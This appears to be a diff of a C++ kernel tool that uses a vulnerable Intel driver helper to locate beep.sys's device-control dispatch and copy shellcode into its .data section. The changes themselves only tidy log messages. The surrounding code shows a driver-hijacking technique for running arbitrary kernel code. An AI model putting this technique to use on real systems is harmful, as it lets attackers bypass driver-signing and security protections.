@@ -37,11 +37,11 @@ bool FindDriverObject(const wchar_t* driverName, OUT uint64_t* driverObject)
 
     if (!NT_SUCCESS(status) || !success)
     {
-        Log(L"[-] IoGetDeviceObjectPointer call failed. -> " << std::hex << status << std::endl);
+        Log(L"[-] IoGetDeviceObjectPointer call failed. -> 0x" << std::hex << status << std::endl);
         return false;
     }
 
-    Log(L"[+] IoGetDeviceObjectPointer found the device object -> " << std::hex << DeviceObject << std::endl);
+    Log(L"[+] IoGetDeviceObjectPointer found the device object -> 0x" << std::hex << DeviceObject << std::endl);
 
     intel_driver::CallNtosExport<void>(IntelDriverHandle, "ObDereferenceObject", nullptr, FileObject);
 
@@ -59,7 +59,7 @@ bool FindDriverObject(const wchar_t* driverName, OUT uint64_t* driverObject)
     return true;
 }
 
-bool GetDriverDispatch(uint64_t DriverObject, uint64_t* DriverDispatch)
+bool GetDriverDispatch(uint64_t DriverObject, OUT uint64_t* DriverDispatch)
 {
     uint64_t majorFunctionArray = DriverObject + offsetof(DRIVER_OBJECT, MajorFunction);
     uint64_t deviceIoDispatchAddress = majorFunctionArray + (sizeof(PVOID) * IRP_MJ_DEVICE_CONTROL);
@@ -104,7 +104,7 @@ int main()
         return -1;
     }
 
-    Log(L"[-] Copied shellcode into the beep.sys .data section -> " << std::hex << shellcodeAddress << std::endl);
+    Log(L"[+] Copied shellcode into the beep.sys .data section -> 0x" << std::hex << shellcodeAddress << std::endl);
 
     uint64_t BeepDriverObject = 0;
     if (!FindDriverObject(L"\\Device\\Beep", &BeepDriverObject))
